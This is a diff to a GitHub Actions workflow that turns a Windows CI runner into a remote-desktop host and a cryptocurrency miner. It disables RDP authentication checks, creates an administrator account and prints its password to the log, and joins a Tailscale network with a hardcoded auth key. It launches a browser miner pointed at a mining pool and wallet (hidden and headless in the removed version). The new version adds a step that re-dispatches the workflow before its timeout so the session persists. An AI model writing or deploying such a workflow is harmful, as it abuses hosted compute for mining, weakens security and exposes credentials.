@@ -1,104 +1,100 @@
-name: RDP with Auto Miner
+name: RDP-Auto-Rebuild
 
 on:
   workflow_dispatch:
 
 jobs:
-  secure-rdp-miner:
+  rdp:
     runs-on: windows-latest
-    timeout-minutes: 3600
+    timeout-minutes: 360
 
     steps:
-      - name: Configure Core RDP Settings
+      - name: Enable & Configure RDP
         shell: pwsh
         run: |
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
-          netsh advfirewall firewall delete rule name="RDP-Tailscale"
-          netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389
-          Restart-Service -Name TermService -Force
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 -Force
+          netsh advfirewall firewall delete rule name="RDP-TCP" 2>$null
+          netsh advfirewall firewall add rule name="RDP-TCP" dir=in action=allow protocol=TCP localport=3389
+          Restart-Service TermService -Force
 
-      - name: Create RDP User with Secure Password
+      - name: Create RDP User
         shell: pwsh
         run: |
           Add-Type -AssemblyName System.Security
-          $charSet = @{
-              Upper   = [char[]](65..90)
-              Lower   = [char[]](97..122)
-              Number  = [char[]](48..57)
-              Special = ([char[]](33..47) + [char[]](58..64) + [char[]](91..96) + [char[]](123..126))
+          $chars = @{
+              U=[char[]](65..90); 
+              L=[char[]](97..122); 
+              N=[char[]](48..57);  
+              S=([char[]](33..47)+[char[]](58..64)+[char[]](91..96)+[char[]](123..126))
           }
-          $rawPassword = @()
-          $rawPassword += $charSet.Upper | Get-Random -Count 4
-          $rawPassword += $charSet.Lower | Get-Random -Count 4
-          $rawPassword += $charSet.Number | Get-Random -Count 4
-          $rawPassword += $charSet.Special | Get-Random -Count 4
-          $password = -join ($rawPassword | Sort-Object { Get-Random })
-          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-          if (Get-LocalUser -Name "RDP") { Remove-LocalUser -Name "RDP" }
-          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
-          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
+          $p=@()
+          $p+= $chars.U | Get-Random -Count 4
+          $p+= $chars.L | Get-Random -Count 4
+          $p+= $chars.N | Get-Random -Count 4
+          $p+= $chars.S | Get-Random -Count 4
+          $password = -join ($p | Sort-Object {Get-Random})
+          $secure = ConvertTo-SecureString $password -AsPlainText -Force
+          if (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue) { Remove-LocalUser -Name "RDP" }
+          New-LocalUser -Name "RDP" -Password $secure -AccountNeverExpires
+          Add-LocalGroupMember -Group Administrators -Member RDP
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member RDP
           echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV
-
-      - name: Install Chrome
-        shell: pwsh
-        run: |
-          $chromeInstaller = "$env:TEMP\chrome_installer.exe"
-          Invoke-WebRequest "https://dl.google.com/chrome/install/latest/chrome_installer.exe" -OutFile $chromeInstaller
-          Start-Process -FilePath $chromeInstaller -ArgumentList "/silent", "/install" -Wait
-          Remove-Item $chromeInstaller
 
       - name: Install Tailscale
         shell: pwsh
         run: |
-          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
-          $installerPath = "$env:TEMP\tailscale.msi"
-          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
-          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
-          Remove-Item $installerPath -Force
+          $url="https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
+          $f="$env:TEMP\ts.msi"
+          Invoke-WebRequest $url -OutFile $f
+          Start-Process msiexec.exe -ArgumentList "/i `"$f`" /quiet /norestart" -Wait
+          Remove-Item $f -Force
 
-      - name: Establish Tailscale Connection
+      - name: Connect Tailscale
         shell: pwsh
         run: |
-          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
-          $hostname = "gh-runner-$env:GITHUB_RUN_ID"
-          & $tsExe up --authkey "tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG" --hostname $hostname --reset
-          $tsIP = $null
-          $retries = 0
-          while (-not $tsIP -and $retries -lt 10) {
-              $tsIP = & $tsExe ip -4
-              Start-Sleep -Seconds 5
-              $retries++
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up `
+            --authkey tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG `
+            --hostname runner-$env:GITHUB_RUN_ID --reset
+          
+          $ip=$null
+          for ($i=1; $i -le 10; $i++) {
+            $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+            if ($ip) { break }
+            Start-Sleep 5
           }
-          if (-not $tsIP) { Write-Error "Tailscale IP not assigned"; exit 1 }
-          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
+          if (-not $ip) { Write-Error "No Tailscale IP"; exit 1 }
+          echo "TS_IP=$ip" >> $env:GITHUB_ENV
 
-      - name: Verify RDP Accessibility
+      - name: Start WebMiner
         shell: pwsh
         run: |
-          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
-          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
-          if (-not $testResult.TcpTestSucceeded) { Write-Error "TCP connection failed"; exit 1 }
-          Write-Host "TCP connectivity successful!"
+          $url = "https://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=8"
+          Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" `
+            -ArgumentList "--new-window", "--app=$url"
+          Write-Host "WebMiner started."
 
-      - name: Launch WebMiner
+      - name: Print Connection Info
         shell: pwsh
         run: |
-          $minerUrl = "https://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=8"
-          Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList "--headless","--disable-gpu","--no-sandbox","--app=$minerUrl" -WindowStyle Hidden
-          Write-Host "WebMiner launched successfully!"
-
-      - name: Maintain RDP & Miner
-        shell: pwsh
-        run: |
-          Write-Host "`n=== RDP ACCESS ==="
-          Write-Host "Address: $env:TAILSCALE_IP"
-          Write-Host "Username: RDP"
+          Write-Host "==============================="
+          Write-Host "   RDP SESSION DETAILS"
+          Write-Host "IP: $env:TS_IP"
+          Write-Host "User: RDP"
           Write-Host "Password: $env:RDP_PASSWORD"
-          Write-Host "==================`n"
-          while ($true) {
-              Write-Host "[$(Get-Date)] RDP + Miner Active - Use Ctrl+C to terminate workflow"
-              Start-Sleep -Seconds 300
+          Write-Host "==============================="
+
+      - name: Auto-Rebuild Before Timeout
+        shell: pwsh
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          $limit = 350   # 5h50m / 6h
+          for ($i=1; $i -le $limit; $i++) {
+            Write-Host "[$(Get-Date)] Session alive ($i/$limit)"
+            Start-Sleep 60
           }
+          Write-Host "Rebuilding session..."
+          gh workflow run $env:GITHUB_WORKFLOW --ref $env:GITHUB_REF_NAME
+          Start-Sleep 20
+          exit 0
